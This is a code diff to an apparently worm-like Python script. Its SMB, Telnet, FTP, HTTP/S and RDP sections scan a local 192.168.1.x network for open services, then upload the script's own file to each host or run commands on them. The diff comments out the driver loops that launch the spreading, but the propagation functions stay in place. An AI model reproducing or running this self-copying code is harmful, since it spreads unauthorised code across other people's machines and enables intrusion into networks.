@@ -33,11 +33,12 @@ def upload_script_to_smb(host, script_path):
         conn.close()
     except Exception as e:
         print(f"Error uploading to {host}: {e}")
-
+"""
 network_prefix = "192.168.1"
 open_smb_hosts = scan_network_for_smb(network_prefix)
 for host in open_smb_hosts:
     upload_script_to_smb(host, __file__)
+"""
 #endregion
 #region TELNET
 def scan_network_for_telnet(network_prefix):
@@ -59,11 +60,12 @@ def execute_command_on_telnet(host, command):
         telnet.close()
     except Exception as e:
         print(f"Error executing command on {host}: {e}")
-
+"""
 network_prefix = "192.168.1"
 open_telnet_hosts = scan_network_for_telnet(network_prefix)
 for host in open_telnet_hosts:
     execute_command_on_telnet(host, "echo 'Hello from Telnet'")
+"""
 #endregion
 #region FTP
 def scan_network_for_ftp(network_prefix):
@@ -88,11 +90,12 @@ def upload_script_to_ftp(host, script_path):
         ftp.quit()
     except Exception as e:
         print(f"Error uploading to {host}: {e}")
-
+"""
 network_prefix = "192.168.1"
 open_ftp_hosts = scan_network_for_ftp(network_prefix)
 for host in open_ftp_hosts:
     upload_script_to_ftp(host, __file__)
+"""
 #endregion
 #region HTTP/S
 def scan_network_for_http(network_prefix):
@@ -116,11 +119,12 @@ def upload_script_to_http(host, script_path):
                 print(f"Successfully uploaded to {host}")
     except Exception as e:
         print(f"Error uploading to {host}: {e}")
-
+"""
 network_prefix = "192.168.1"
 open_http_hosts = scan_network_for_http(network_prefix)
 for host in open_http_hosts:
     upload_script_to_http(host, __file__)
+"""
 #endregion
 #region RDP
 def scan_network_for_rdp(network_prefix):
@@ -141,9 +145,10 @@ def execute_command_on_rdp(host, command):
         print(result.std_out.decode())
     except Exception as e:
         print(f"Error executing command on {host}: {e}")
-
+"""
 network_prefix = "192.168.1"
 open_rdp_hosts = scan_network_for_rdp(network_prefix)
 for host in open_rdp_hosts:
     execute_command_on_rdp(host, "echo 'Hello from RDP'")
+"""
 #endregion
